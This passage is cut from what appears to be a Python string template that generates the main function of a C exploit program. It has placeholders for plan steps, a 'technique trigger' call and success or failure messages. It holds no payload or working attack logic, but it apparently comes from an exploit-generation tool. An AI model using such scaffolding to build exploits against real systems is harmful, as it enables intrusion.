                    fprintf(stderr, "[-] Technique setup failed\\n");
                    return 1;
                }}

                // Execute plan steps
            {step_calls}

                // Technique-specific trigger
                if (technique_trigger() < 0) {{
                    fprintf(stderr, "[-] Technique trigger failed\\n");
                    return 1;
                }}

                fprintf(stderr, "[+] Exploit completed\\n");
                return 0;

            fail:
                fprintf(stderr, "[-] Exploit failed\\n");
                return 1;
            }}
        """)
